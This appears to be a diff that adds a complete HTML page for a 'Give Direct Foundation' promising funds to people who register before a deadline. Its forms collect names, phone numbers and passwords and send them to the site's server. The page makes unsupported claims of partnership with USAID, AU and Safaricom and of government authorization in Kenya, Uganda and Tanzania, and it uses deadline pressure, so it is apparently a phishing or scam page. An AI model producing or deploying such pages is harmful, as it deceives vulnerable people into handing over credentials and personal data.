@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Give Direct Foundation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #005347;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            color: white;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #005347;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 50px;
+            height: 50px;
+            border: 5px solid white;
+            border-top: 5px solid lightgray;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        input, button {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: white;
+            color: #005347;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: lightgray;
+        }
+
+        .toggle-btn {
+            background: none;
+            color: white;
+            border: none;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+      
+        .floating-text {
+            position: absolute;
+            top: 10px;
+            width: 100%;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .floating-text p {
+            display: inline-block;
+            color: red;
+            font-size: 14px;
+            font-weight: bold;
+            animation: moveText 10s linear infinite;
+        }
+
+        @keyframes moveText {
+            from { transform: translateX(100%); }
+            to { transform: translateX(-100%); }
+        }
+
+        /* GD Section */
+        .gd-section {
+            max-width: 600px;
+            margin: 30px auto;
+            text-align: center;
+        }
+
+        .gd-title {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .gd-logo {
+            font-size: 100px;
+            font-weight: bold;
+        }
+
+        .gd-desc {
+            font-size: 18px;
+            line-height: 1.5;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="floating-text">
+        <p style="color: white;">Funds to be disbursed to those registered with Give Direct Foundation before 10th April</p>
+    </div>
+
+    <!-- GD Section -->
+    <div class="gd-section">
+        <h1 class="gd-title">GIVE DIRECT FOUNDATION FUNDS</h1>
+        <div class="gd-logo">GD</div>
+    </div>
+    <div id="spinner" class="loading-spinner"></div>
+
+    <div id="loginForm" class="container">
+        <h2>Login</h2>
+        <form onsubmit="handleLogin(event)">
+            <input type="number" id="login-phone" placeholder="Phone Number" required>
+            <input type="password" id="login-password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <button class="toggle-btn" onclick="toggleForms()">Don't have an account? Register</button>
+    </div>
+
+    <div id="registerForm" class="container" style="display: none;">
+        <h2>Register</h2>
+        <form onsubmit="handleRegister(event)">
+            <input type="text" id="register-name" placeholder="Full Name" required>
+            <input type="number" id="register-phone" placeholder="Phone Number" required>
+            <input type="password" id="register-password" placeholder="Password" required>
+            <button type="submit">Register</button>
+        </form>
+        <button class="toggle-btn" onclick="toggleForms()">Already have an account? Login</button>
+    </div>
+
+    <script>
+        function toggleForms() {
+            document.getElementById("loginForm").style.display =
+                document.getElementById("loginForm").style.display === "none" ? "block" : "none";
+            document.getElementById("registerForm").style.display =
+                document.getElementById("registerForm").style.display === "none" ? "block" : "none";
+        }
+
+        function showSpinner() {
+            document.getElementById("spinner").style.display = "block";
+        }
+
+        async function handleLogin(event) {
+            event.preventDefault();
+            showSpinner();
+            
+            const phone = document.getElementById("login-phone").value;
+            const response = await fetch("/login", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone }),
+            });
+
+            const data = await response.json();
+            window.location.href = data.redirectUrl;
+        }
+
+        async function handleRegister(event) {
+            event.preventDefault();
+            showSpinner();
+
+            const name = document.getElementById("register-name").value;
+            const phone = document.getElementById("register-phone").value;
+            const password = document.getElementById("register-password").value;
+
+            const response = await fetch("/register", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ name, phone, password }),
+            });
+
+            const data = await response.json();
+            window.location.href = data.redirectUrl;
+        }
+    </script>
+    
+
+    <div>
+        <p class="gd-desc">
+            GIVE DIRECT is a Foundation from AMERICA <br>
+            in partnership with USAID,AU,SAFARICOM AND many more <br>
+            Authorized by the GOVERNMENT of KENYA 🇰🇪, UGANDA 🇺🇬 & TANZANIA 🇹🇿 <br>
+            to help People financially.
+        </p>
+    </div>
+</body>
+</html>
